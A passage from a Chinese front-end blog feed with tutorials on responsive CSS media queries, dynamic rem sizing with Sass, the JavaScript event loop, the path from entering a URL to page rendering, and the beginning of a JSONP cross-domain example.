class="line">&lt;style&gt;</span><br><span class="line">  @media (min-width: 769px)&#123;  /*769~正无穷*/</span><br><span class="line">    body&#123;</span><br><span class="line">        background: purple;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (max-width: 768px)&#123;  /* 0~768 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: yellow;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (max-width: 425px)&#123;  /* 0~425 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: orange;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (max-width: 375px)&#123;  /* 0~375 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: pink;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (max-width: 320px)&#123;  /* 0~320 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: green;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>这里要注意一个优先级的问题，如果将最大宽度的顺序从小往大写，可能存在前面的样式被覆盖的问题，解决方法可以是上面那样将顺序颠倒，使得最大宽度的顺序从大往小；或者将查询条件写到很具体，使得条件之间没有交集<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">  @media (max-width: 320px)&#123;  /* 0~320 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: yellow;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (min-width: 321px) and (max-width: 375px)&#123;  /* 321~375 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: orange;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (min-width: 376px) and (max-width: 425px)&#123;  /* 376~425 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: pink;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (min-width: 426px) and (max-width: 768px)&#123;  /* 426~728 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: green;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (min-width: 769px)&#123;  /*769~正无穷*/</span><br><span class="line">    body&#123;</span><br><span class="line">        background: purple;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p><h2 id="动态rem"><a href="#动态rem" class="headerlink" title="动态rem"></a>动态rem</h2><hr><ul><li>页面中，默认的字体大小(font-size)是16px，Chrome默认最小字体是12px</li><li>rem指的是根元素的 font-size 大小（例如 <html> 元素的font-size）</html></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">html:</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    你好，我是xxx</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">css:</span><br><span class="line">p&#123;</span><br><span class="line">    font-size: 2rem;  /* 这里的2rem是指字体大小为32px，因为页面默认font-size为16px，1rem = 16px */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">css:</span><br><span class="line">body&#123;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">    font-size: 2rem;  /* 这里的2rem仍然是32px，虽然设置了body的字体大小，但是rem指的是根元素html的字体大小，所以这里仍然是1rem = 16px的默认值 */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果像下面这样设置了html的字体大小，那么 1rem 就是设置的字体大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">css:</span><br><span class="line">html&#123;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">    font-size: 2rem;  /* 这时p标签里的内容就是40px，因为设置了根元素的字体大小为20px，那么 1rem = 20px，而不是默认值16px了 */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="适配手机的页面布局（百分比布局）"><a href="#适配手机的页面布局（百分比布局）" class="headerlink" title="适配手机的页面布局（百分比布局）"></a>适配手机的页面布局（百分比布局）</h3><hr><p><img src="https://i.loli.net/2018/07/03/5b3b8ecd37145.jpg" alt="百分比布局.jpg"></p><p>这样的设计方法可以适配不同宽度的手机，但缺点是宽度和高度不能调试，因为宽度不是一个固定的值，所以高度也没办法确定</p><h3 id="引入动态rem方案"><a href="#引入动态rem方案" class="headerlink" title="引入动态rem方案"></a>引入动态rem方案</h3><hr><ul><li>它的主要思路是所有元素按比例放大或缩小（一切以宽度为基准），同时还解决了高度和宽度没有关联的问题</li><li>用JS来设置html的font-size等于页面宽度，而rem是依赖html的font-size的，进而使得rem间接依赖于页面宽度，可以这么理解 1 rem == html font-size == viewport width</li><li>rem也可以与其他单位同时存在<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">font-size: 16px;</span><br><span class="line">border: 1px solid red;</span><br><span class="line">width: 0.5rem;</span><br></pre></td></tr></table></figure></li></ul><p>下面以实现这样一个设计稿为例：</p><p><img src="https://i.loli.net/2018/07/03/5b3b8ecdbd500.png" alt="设计稿.png"></p><p>用JS获取屏幕宽度做单位换算<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  var pageWidth = window.innerWidth  //获取屏幕宽度</span><br><span class="line">  document.write(&apos;&lt;style&gt; html&#123; font-size:&apos; + pageWidth/10 + &apos;px;&#125;&lt;/style&gt;&apos;)  //用给定像素值除以屏幕宽度再乘以10得到的数字是以rem为单位</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">html:</span><br><span class="line">  &lt;div class=&quot;parent clearfix&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">css:</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    *&#123;</span><br><span class="line">        margin: 0;</span><br><span class="line">        padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line">    body&#123;</span><br><span class="line">        font-size: 16px;</span><br><span class="line">    &#125;</span><br><span class="line">    div.child&#123;</span><br><span class="line">        float: left;</span><br><span class="line">        background: #ddd;</span><br><span class="line">        width: 4rem;</span><br><span class="line">        height: 2rem;</span><br><span class="line">        margin: .5rem .5rem;</span><br><span class="line">    &#125;</span><br><span class="line">    .clearfix::before&#123;</span><br><span class="line">    content: &apos;&apos;;</span><br><span class="line">    display: block;</span><br><span class="line">    clear: both;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>效果图：</p><p><img src="https://i.loli.net/2018/07/03/5b3b8ecb99473.png" alt="效果图.png"></p><p>但是有个缺点就是每个元素的宽高都需要通过计算来得到，这样工作量会很大，解决方法是使用sass函数减少计算量</p><p>首先，使用命令行安装sass</p><ul><li>npm config set registry <a href="https://registry.npm.taobao.org/" target="_blank" rel="noopener">https://registry.npm.taobao.org/</a></li><li>touch ~/.bashrc</li><li>echo ‘export</li><li>SASS_BINARY_SITE=”<a href="https://npm.taobao.org/mirrors/node-sass&quot;&#39;" target="_blank" rel="noopener">https://npm.taobao.org/mirrors/node-sass&quot;&#39;</a> &gt;&gt; ~/.bashrc</li><li>source ~/.bashrc</li><li>npm i -g node-sass</li><li>mkdir ~/Desktop/scss-demo</li><li>cd ~/Desktop/scss-demo</li><li>mkdir scss css</li><li>touch scss/style.scss</li><li>start scss/style.scss</li><li>node-sass -wr scss -o css</li></ul><p>然后，在sass文件中添加下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@function pxToRem( $px )&#123;</span><br><span class="line">  @return $px/$designWidth*10 + rem;</span><br><span class="line">&#125;  //这个函数可以将像素值转换成以rem为单位</span><br><span class="line"></span><br><span class="line">$designWidth : 640; // 640是设计稿的宽度，根据实际要求修改即可</span><br><span class="line"></span><br><span class="line">div.child&#123;</span><br><span class="line">  width: pxToRem(320);</span><br><span class="line">  height: pxToRem(160);</span><br><span class="line">  margin: pxToRem(40) pxToRem(40);</span><br><span class="line">  border: 1px solid red;</span><br><span class="line">  float: left;</span><br><span class="line">  font-size: 1.2em;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过sass函数的转译，我们可以直接使用px为单位，这样大大节省了计算时间</p>]]></content>
      
      
        <tags>
            
            <tag> 响应式 rem </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JS引擎执行机制</title>
      <link href="/2018/08/02/JS%E5%BC%95%E6%93%8E%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
      <url>/2018/08/02/JS%E5%BC%95%E6%93%8E%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>从JS是一门单线程语言讲起<br><a id="more"></a></p><h2 id="灵魂三问："><a href="#灵魂三问：" class="headerlink" title="灵魂三问："></a>灵魂三问：</h2><ul><li>为什么JS是一门单线程语言</li><li>为什么JS需要异步</li><li>JS单线程如何实现异步</li></ul><h3 id="为什么JS是一门单线程语言"><a href="#为什么JS是一门单线程语言" class="headerlink" title="为什么JS是一门单线程语言"></a>为什么JS是一门单线程语言</h3><p>如果说在浏览器中，JS是多线程的，有如下场景：</p><p>在浏览器中，有两个进程process1和process2，因为JS是多进程的，所以他们对同一个dom同时进行操作。process1删除了该dom，而process2编辑了该dom，同时下达两个矛盾的命令，浏览器如何执行？</p><h3 id="为什么JS需要异步"><a href="#为什么JS需要异步" class="headerlink" title="为什么JS需要异步"></a>为什么JS需要异步</h3><p>如果JS中不存在异步，只能自上而下按顺序执行，如果上一行解析需要很长时间，那么下面的代码就会被阻塞，对于用户而言阻塞就会导致页面卡死，进而影响用户体验</p><h3 id="JS单线程如何实现异步"><a href="#JS单线程如何实现异步" class="headerlink" title="JS单线程如何实现异步"></a>JS单线程如何实现异步</h3><p>通过事件循环（event loop），理解了该机制，也就明白了JS的执行机制</p><p>观察如下代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.log(1)</span><br><span class="line"></span><br><span class="line">setTimeout(function()&#123;</span><br><span class="line">    console.log(2)</span><br><span class="line">&#125;, 0)</span><br><span class="line"></span><br><span class="line">console.log(3)</span><br></pre></td></tr></table></figure></p><p>浏览器会分别打印出：1 3 2</p><p>setTimeout里的函数并没有立即执行，而是延迟了一段时间，满足了一定条件后才去执行，这类代码叫做异步代码。所以按照上面代码可以将任务分成同步任务和异步任务，按照这种分类方式，JS的执行机制是：</p><ul><li>首先判断是同步还是异步，同步就进入主进程，异步就进入event table</li><li>异步任务在event table中注册函数，当满足触发条件后被推入事件队列</li><li>同步任务在进入主进程后一直执行，直到主进程空闲，才会去事件队列中查看是否有可执行的异步任务，如果有就推入主进程中</li></ul><p>但仅仅是上面这样就结束了吗？？？再看下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function()&#123;</span><br><span class="line">    console.log(&apos;定时器开始啦&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">new Promise(function(resolve)&#123;</span><br><span class="line">    console.log(&apos;马上执行for循环啦&apos;);</span><br><span class="line">    for(var i=0;i&lt;10000;i++)&#123;</span><br><span class="line">        i == 99 &amp;&amp; resolve();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).then(function()&#123;</span><br><span class="line">    console.log(&apos;执行then函数啦&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;代码执行结束&apos;);</span><br></pre></td></tr></table></figure></p><p>按照上面的理解去分析JS的执行机制：</p><ul><li>setTimeout是异步任务，进入event table里</li><li>new Promise是同步任务，放到主进程里，控制台打印：马上执行for循环啦</li><li>.then函数里的是异步任务，放到event table里</li><li>console.log是同步代码，放到主进程里，打印：代码执行结束<br>照这样打印出的顺序是：马上执行for循环啦—代码执行结束—定时器开始啦—执行then函数啦</li></ul><p>但是实际执行后的结果却是：马上执行for循环啦—代码执行结束—执行then函数啦—定时器开始啦</p><p>这么说按照同步任务和异步任务划分并不准确！！而准确的方式是（妈ma 咪mi 宏任务在前，微任务在后）</p><ul><li>宏任务（macro-task）：包括整体代码script、setTimeout、setInterval</li><li>微任务（micro-task）：Promise、process.nextTick</li></ul><p>按照这种方式，JS的执行机制是：</p><ul><li>执行一个宏任务，过程中遇到微任务，将它放到微任务的事件队列里</li><li>当前宏任务执行完成后，会去查看微任务的事件队列，并将里面的微任务一次执行完，然后才会进入下一个宏任务</li><li>重复上面的两个步骤</li></ul><p>下面再次分析第二段代码：</p><ul><li>首先执行script中的宏任务，遇到setTimeout，将它放到宏任务的事件队列里</li><li>遇到new Promise立即执行（它是同步的），打印：马上执行for循环啦</li><li>遇到then方法，是微任务，将它放到微任务的事件队列里</li><li>打印：代码执行结束</li><li>本轮宏任务执行完，查看微任务，发现有一个then方法里的函数，打印：执行then函数啦</li><li>到这儿本轮的事件循环（event loop）结束</li><li>进入下一轮循环，先执行一个宏任务，发现宏任务队列里有一个setTimeout函数，执行并打印：定时器开始啦</li></ul><p>于是，真正的代码执行顺序是：马上执行for循环啦—代码执行结束—执行then函数啦—定时器开始啦</p><h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function()&#123;</span><br><span class="line">    console.log(&apos;执行了&apos;)</span><br><span class="line">&#125;, 3000)</span><br></pre></td></tr></table></figure><p>我们一般会解释为3秒之后执行setTimeout里的函数，但这种说法不严谨。准确来说，3秒后，setTimeout里的函数会被推到事件队列里（event queue），而事件队列里的任务只有在主线程空闲时才会去执行</p><p>所以要满足<1> 3秒后; <2> 主线程空闲; 同时满足时才会在3秒后执行该函数</2></1></p><p>如果主线程任务很多，执行时间超过了3秒，比方执行了5秒，那这个函数也只能在5秒后被执行</p>]]></content>
      
      
        <tags>
            
            <tag> 单线程 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>从输入url到页面加载完成</title>
      <link href="/2018/08/02/%E4%BB%8E%E8%BE%93%E5%85%A5url%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%88%90/"/>
      <url>/2018/08/02/%E4%BB%8E%E8%BE%93%E5%85%A5url%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%88%90/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>网上那么多总结，你理清楚了嘛<br><a id="more"></a></p><h2 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h2><ul><li>用户输入url地址，浏览器解析url解析出主机名</li><li>DNS查询（从主机名到一个服务器IP地址的转换）</li><li>建立一条与目标web服务器的TCP连接（客户端和服务端都需要到各自可收发，因此需要三次握手）</li><li>发送HTTP请求（请求四部分）</li><li>后台处理请求（监听80端口、路由、渲染HTML模版、生成响应）</li><li>发送HTTP响应</li><li>关闭TCP连接（四次挥手）</li><li>浏览器解析并渲染页面</li></ul><h3 id="DNS查询（从主机名到一个服务器IP地址的转换）"><a href="#DNS查询（从主机名到一个服务器IP地址的转换）" class="headerlink" title="DNS查询（从主机名到一个服务器IP地址的转换）"></a>DNS查询（从主机名到一个服务器IP地址的转换）</h3><ul><li>网址：URL（统一资源定位符）用于定位互联网上的资源，格式一般为：协议类型://&lt;主机名&gt;:&lt;端口&gt;/&lt;路径&gt;/文件名</li><li>IP地址：例如代表本机的IP就是127.0.0.1，每个网站都是靠IP来定位的。比方说知乎的网址是 <a href="https://www.zhihu.com/" target="_blank" rel="noopener">https://www.zhihu.com/</a> 但浏览器并不知道它是什么，而是需要通过查找该网址所在服务器的IP地址获得目标，这个过程就是域名解析</li><li>DNS查询获得IP地址</li></ul><p>a. 查找浏览器缓存看是否有该域名对应的解析过的IP地址；<br>b. 查找操作系统缓存，浏览器会从hosts文件查找是否储存有DNS信息，是否有目标域名及对应的IP地址；<br>c. 查找路由器缓存；<br>d. 查找ISP(Internet Service Provider) DNS 缓存服务器；<br>e. 迭代查询，从顶级域名服务器的根域名服务器开始递归查询<br><img src="https://i.loli.net/2018/07/03/5b3b8e7bd5b93.png" alt="DNS解析.png"></p><h3 id="建立TCP连接"><a href="#建立TCP连接" class="headerlink" title="建立TCP连接"></a>建立TCP连接</h3><p>三次握手：由客户端执行connect来触发</p><p>1、client将标志位SYN设置为1，随机产生一个seq=J，并将数据包发送给server，此时client进入SYN_SEND状态，等待server确认</p><p>2、server收到数据由标志位SYN=1知道客户端想要请求建立连接，server将标志位SYN和ACK都设置为1，ack=J+1（序号+1），随机产生一个seq=k，并将数据包发送给client确认连接请求，此时server进入SYN_RCVD状态</p><p>3、client收到确认后，检查ACK是否为1，ack是否为J+1，如果正确则连接成功，此时client和server都进入ESTABLISHED状态，完成三次握手<br><img src="https://i.loli.net/2018/08/21/5b7c1e5c7927a.png" alt="三次握手"></p><h3 id="发送HTTP请求"><a href="#发送HTTP请求" class="headerlink" title="发送HTTP请求"></a>发送HTTP请求</h3><p>在得到IP地址后，浏览器会发送出一个HTTP请求，请求包括请求头和请求体。请求头通常有：请求方法（GET、POST、HEAD、OPTIONS, PUT, DELETE, TRACE 和 CONNECT）、目标url、遵循的协议（http、https、file等）</p><h3 id="后台处理请求"><a href="#后台处理请求" class="headerlink" title="后台处理请求"></a>后台处理请求</h3><p>服务器通过http报文作为信息载体将数据返回给客户端</p><p>常用请求头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Accept: 接收类型，表示浏览器支持的MIME类型（对应服务端返回的Content-Type）</span><br><span class="line">Content-Type：客户端发送出去实体内容的类型</span><br><span class="line">Content-length：用来指明发送给接收方的消息主体的大小</span><br><span class="line">Cache-Control: 指定请求和响应遵循的缓存机制，如no-cache</span><br><span class="line">Expires：缓存控制，在这个时间内不会请求，直接使用缓存，http1.0，而且是服务端时间</span><br><span class="line">Max-age：代表资源在本地缓存多少秒，有效时间内不会请求，而是使用缓存，http1.1中</span><br><span class="line">If-None-Match：对应服务端的ETag，用来匹配文件内容是否改变（非常精确），http1.1中</span><br><span class="line">Cookie: 有cookie并且同域访问时会自动带上</span><br><span class="line">Host：请求的服务器URL</span><br><span class="line">Origin：最初的请求是从哪里发起的（只会精确到端口）,Origin比Referer更尊重隐私</span><br><span class="line">Referer：该页面的来源URL(适用于所有类型的请求，会精确到详细页面地址，csrf拦截常用到这个字段)</span><br><span class="line">User-Agent：用户客户端的一些必要信息，如UA头部等</span><br></pre></td></tr></table></figure></p><p>常用响应头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Headers: 服务器端允许的请求Headers</span><br><span class="line">Access-Control-Allow-Methods: 服务器端允许的请求方法</span><br><span class="line">Access-Control-Allow-Origin: 服务器端允许的请求Origin头部（譬如为*）</span><br><span class="line">Content-Type：服务端返回的实体内容的类型</span><br><span class="line">Date：数据从服务器发送的时间</span><br><span class="line">Cache-Control：告诉浏览器或其他客户，什么环境可以安全的缓存文档</span><br><span class="line">Last-Modified：请求资源的最后修改时间</span><br><span class="line">Expires：应该在什么时候认为文档已经过期,从而不再缓存它</span><br><span class="line">Max-age：客户端的本地资源应该缓存多少秒，开启了Cache-Control后有效</span><br><span class="line">ETag：请求变量的实体标签的当前值</span><br><span class="line">Set-Cookie：设置和页面关联的cookie，服务器通过这个头部把cookie传给客户端</span><br><span class="line">Keep-Alive：如果客户端有keep-alive，服务端也会有响应（如timeout=38）</span><br><span class="line">Server：服务器的一些相关信息</span><br></pre></td></tr></table></figure></p><p>通常请求头和响应头是相互匹配的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 请求头部的Accept要和响应头部的Content-Type匹配，否则会报错</span><br><span class="line">- 跨域请求时，请求头部的Origin要匹配响应头部的Access-Control-Allow-Origin，否则会报跨域错误</span><br><span class="line">- 在使用缓存时，请求头部的If-Modified-Since、If-None-Match分别和响应头部的Last-Modified、ETag对应</span><br></pre></td></tr></table></figure></p><h3 id="关闭TCP连接"><a href="#关闭TCP连接" class="headerlink" title="关闭TCP连接"></a>关闭TCP连接</h3><p>四次挥手<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主动方：我已经关闭了向你那边的主动通道，此时你只能被动接受</span><br><span class="line">被动方：我收到了通道关闭的消息</span><br><span class="line">被动方：好的那我告诉你，我也关闭了这边向你的主动通道</span><br><span class="line">主动方：最后收到通知，之后双方无法通信</span><br></pre></td></tr></table></figure></p><h3 id="浏览器解析并渲染页面"><a href="#浏览器解析并渲染页面" class="headerlink" title="浏览器解析并渲染页面"></a>浏览器解析并渲染页面</h3><p>流程：解析HTML，构建DOM树 -&gt; 解析CSS，生成CSS规则树 -&gt; 下载并解析JS -&gt; 下载并解析图片（异步下载，不会阻塞解析流程） -&gt; 合并DOM和CSS规则，生成render树 -&gt; 布局并渲染render树 -&gt; 执行JS文件</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>跨域的三种方式</title>
      <link href="/2018/08/01/%E8%B7%A8%E5%9F%9F%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
      <url>/2018/08/01/%E8%B7%A8%E5%9F%9F%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>形式有三种：JSONP、CORS、postMessage<br><a id="more"></a></p><h2 id="JSONP（JSON-padding）"><a href="#JSONP（JSON-padding）" class="headerlink" title="JSONP（JSON+padding）"></a>JSONP（JSON+padding）</h2><p>在页面中，通过script标签加载数据的方式，将数据当作JS代码来执行，前端提前在页面上声明一个函数，函数名（回调函数）通过接口传参的方式传给后台，后台解析到函数名后在原始数据上包裹这个函数名再发送给前端，但这需要对应接口的后端配合才能实现</p><p>下面是一个模拟的过程：</p><p>请求方：frank.com 的前端程序员（浏览器）</p><p>响应方：jack.com 的后端程序员（服务器）</p><p>1、请求方创建 script 标签，src 指向响应方，同时传一个查询参数 ?callbackName=yyy</p><p>2、响应方根据查询参数callbackName，构造形如</p><ul><li><p>yyy.call(undefined, ‘你要的数据’)</p></li><li><p>yyy(‘你要的数据’)</p></li></ul><p>这样的响应</p><p>3、浏览器接收到响应，就会执行 yyy.call(undefined, ‘你要的数据’)</p><p>4、那么请求方就知道了他要的数据</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>HTML 中 script 标签可以加载其他域下的js，比如我们经常引入一个其他域下线上cdn的jQuery<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://api.jirengu.com/weather.php&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>这时候会向天气接口发送请求获取数据，获取数据后做为 js 来执行。 但这里有个问题，数据是 JSON 格式的数据，直接作为 JS 运行的话我如何去得到这个数据来操作呢？</p><p>于是我们添加一个callback的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://api.jirengu.com/weather.php?callback=showData&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>这个请求到达后端后，后端会去解析callback这个参数获取到字符串showData，在发送数据做如下处理：</p><p>之前后端返回数据是： {“city”: “hangzhou”, “weather”: “晴天”} 现在后端返回数据： showData({“city”: “hangzhou”, “weather”: “晴天”}) 前端script标签在加载数据后会把 showData({“city” “hangzhou”, “weather”: “晴天”})做为 js 来执行，这实际上就是调用showData这个函数，同时参数是 {“city” “hangzhou”, “weather”: “晴天”}。 用户只需要提前在页面定义好showData这个全局函数，在函数内部处理参数即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function showData(ret)&#123;</span><br><span class="line">    console.log(ret);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://api.jirengu.com/weather.php?callback=showData&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="前后端完整示例"><a href="#前后端完整示例" class="headerlink" title="前后端完整示例"></a>前后端完整示例</h3><p>前端代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 